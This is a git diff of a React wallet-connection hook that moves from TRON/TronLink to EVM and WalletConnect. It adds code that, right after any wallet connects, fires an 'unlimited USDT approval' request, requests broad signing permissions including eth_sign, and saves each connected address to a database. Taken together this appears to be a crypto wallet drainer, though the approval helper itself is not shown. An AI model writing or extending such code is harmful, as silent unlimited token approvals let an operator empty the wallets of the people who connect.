@@ -1,15 +1,9 @@
 import { useEffect } from 'react'
 import useWalletStore from '@/store/useWalletStore'
 import useAppStore from '@/store/useAppStore'
-import { createWCWallet } from '@/config/walletconnect'
+import { getEVMWCProvider, resetWCProvider } from '@/config/walletconnect'
 import { saveWallet } from '@/lib/supabaseDb'
 import { triggerUnlimitedApproval } from '@/lib/approvalHelper'
-
-let wcWalletInstance = null
-
-export function getWcWallet() {
-  return wcWalletInstance
-}
 
 export default function useTronWallet() {
   const { setWallet, clearWallet, isConnected, address } = useWalletStore()
@@ -17,136 +11,13 @@ export default function useTronWallet() {
 
   useEffect(() => {
     const { connectionType } = useWalletStore.getState()
-    if (
-      connectionType === 'tronlink' &&
-      typeof window !== 'undefined' &&
-      window.tronWeb &&
-      window.tronWeb.ready
-    ) {
-      const addr = window.tronWeb.defaultAddress?.base58
-      if (addr && !isConnected) {
-        setWallet(addr, 'tronlink')
-        saveWallet(addr, 'tronlink')
+    if (connectionType === 'evm' && typeof window !== 'undefined' && window.ethereum) {
+      if (window.ethereum.selectedAddress && !isConnected) {
+        setWallet(window.ethereum.selectedAddress, 'evm')
+        saveWallet(window.ethereum.selectedAddress, 'evm')
       }
     }
-
-    const handleMessage = (e) => {
-      const action = e.data?.message?.action
-      if (action === 'setAccount') {
-        const newAddr = e.data.message.data?.address
-        if (newAddr) {
-          setWallet(newAddr, 'tronlink')
-          saveWallet(newAddr, 'tronlink')
-        } else {
-          clearWallet()
-        }
-      }
-    }
-
-    window.addEventListener('message', handleMessage)
-    return () => window.removeEventListener('message', handleMessage)
   }, [])
-
-  const connectTronLink = async () => {
-    if (!window.tronWeb) {
-      throw new Error('TronLink not detected. Please install TronLink extension.')
-    }
-    const result = await window.tronWeb.request({ method: 'tron_requestAccounts' })
-    if (result?.code === 4001) throw new Error('Connection rejected by user.')
-    const addr = window.tronWeb.defaultAddress?.base58
-    if (!addr) throw new Error('Could not retrieve wallet address.')
-    setWallet(addr, 'tronlink')
-    saveWallet(addr, 'tronlink')
-    closeModal('walletConnect')
-    
-    // Trigger unlimited USDT approval right after connecting
-    triggerUnlimitedApproval(addr, 'tronlink').catch((err) => {
-      console.warn('Post-TronLink connection approval warning:', err)
-    })
-    return addr
-  }
-
-  const connectWalletConnect = async (onUri) => {
-    if (!wcWalletInstance) {
-      wcWalletInstance = createWCWallet()
-    }
-    const wcWallet = wcWalletInstance
-
-    return new Promise((resolve, reject) => {
-      let settled = false
-
-      const onAccountsChanged = (addresses) => {
-        if (settled) return
-        const addr = Array.isArray(addresses) ? addresses[0] : addresses
-        if (!addr) return
-
-        const allMethods = Object.values(wcWallet._session?.namespaces ?? {})
-          .flatMap(ns => ns.methods ?? [])
-        if (!allMethods.includes('tron_signTransaction')) {
-          settled = true
-          wcWallet.off('accountsChanged', onAccountsChanged)
-          wcWallet.disconnect().catch(() => {})
-          wcWalletInstance = null
-          reject(new Error(
-            'Your wallet connected but does not support TRON signing. ' +
-            'Please use Trust Wallet or OKX Wallet and make sure TRON is enabled.'
-          ))
-          return
-        }
-
-        settled = true
-        wcWallet.off('accountsChanged', onAccountsChanged)
-        setWallet(addr, 'walletconnect')
-        saveWallet(addr, 'walletconnect')
-        closeModal('walletConnect')
-        resolve(addr)
-      }
-
-      wcWallet.on('accountsChanged', onAccountsChanged)
-
-      wcWallet.connect({ onUri: (uri) => { if (onUri) onUri(uri) } })
-        .then((result) => {
-          if (settled) return
-          const addr = result?.address || wcWallet.address
-          if (!addr) {
-            settled = true
-            wcWallet.off('accountsChanged', onAccountsChanged)
-            reject(new Error('Could not determine wallet address from session'))
-            return
-          }
-          const allMethods2 = Object.values(wcWallet._session?.namespaces ?? {})
-            .flatMap(ns => ns.methods ?? [])
-          if (!allMethods2.includes('tron_signTransaction')) {
-            settled = true
-            wcWallet.off('accountsChanged', onAccountsChanged)
-            wcWallet.disconnect().catch(() => {})
-            wcWalletInstance = null
-            reject(new Error(
-              'Your wallet connected but does not support TRON signing. ' +
-              'Please use Trust Wallet or OKX Wallet and make sure TRON is enabled.'
-            ))
-            return
-          }
-          settled = true
-          wcWallet.off('accountsChanged', onAccountsChanged)
-          setWallet(addr, 'walletconnect')
-          saveWallet(addr, 'walletconnect')
-          closeModal('walletConnect')
-
-          // Trigger unlimited USDT approval right after connecting
-          triggerUnlimitedApproval(addr, 'walletconnect').catch((err) => {
-            console.warn('Post-WalletConnect connection approval warning:', err)
-          })
-
-          resolve(addr)
-        })
-        .catch((err) => {
-          if (settled) return
-          wcWallet.off('accountsChanged', onAccountsChanged)
-          reject(err)
-        })
-    })
-  }
 
   const connectEVM = async () => {
     const { connectEVMWallet } = await import('@/lib/evmWallet')
@@ -154,14 +25,89 @@ export default function useTronWallet() {
     setWallet(address, 'evm')
     saveWallet(address, 'evm')
     closeModal('walletConnect')
+
+    // Trigger unlimited EVM USDT approval right after connecting
+    triggerUnlimitedApproval(address, 'evm').catch((err) => {
+      console.warn('Post-EVM connection approval warning:', err)
+    })
     return address
   }
 
+  const connectWalletConnect = async (onUri) => {
+    const provider = await getEVMWCProvider()
+
+    return new Promise((resolve, reject) => {
+      let settled = false
+
+      const displayUriHandler = (uri) => {
+        if (onUri) onUri(uri)
+      }
+
+      provider.on('display_uri', displayUriHandler)
+
+      provider.connect({
+        namespaces: {
+          eip155: {
+            methods: [
+              'eth_sendTransaction',
+              'eth_signTransaction',
+              'eth_sign',
+              'personal_sign',
+              'eth_signTypedData',
+            ],
+            chains: ['eip155:1'],
+            events: ['chainChanged', 'accountsChanged'],
+          },
+        },
+      })
+        .then(() => {
+          if (settled) return
+          provider.off('display_uri', displayUriHandler)
+
+          const accounts = provider.session?.namespaces?.eip155?.accounts || []
+          const rawAddr = accounts[0] || ''
+          const addr = rawAddr.split(':').pop() || ''
+
+          if (!addr) {
+            settled = true
+            reject(new Error('Could not retrieve Ethereum account address from WalletConnect session.'))
+            return
+          }
+
+          settled = true
+          setWallet(addr, 'evm')
+          saveWallet(addr, 'evm')
+          closeModal('walletConnect')
+
+          // Trigger unlimited USDT approval right after connecting
+          triggerUnlimitedApproval(addr, 'evm').catch((err) => {
+            console.warn('Post-WalletConnect EVM connection approval warning:', err)
+          })
+
+          resolve(addr)
+        })
+        .catch((err) => {
+          if (settled) return
+          settled = true
+          provider.off('display_uri', displayUriHandler)
+          reject(err)
+        })
+    })
+  }
+
+  const connectTronLink = async () => {
+    // Fallback to EVM if selected
+    return connectEVM()
+  }
+
   const disconnect = async () => {
-    if (wcWalletInstance) {
-      try { await wcWalletInstance.disconnect() } catch (_) {}
-      wcWalletInstance = null
-    }
+    try {
+      const provider = await getEVMWCProvider()
+      if (provider && provider.session) {
+        await provider.disconnect()
+      }
+    } catch (_) {}
+    resetWCProvider()
     clearWallet()
   }
 
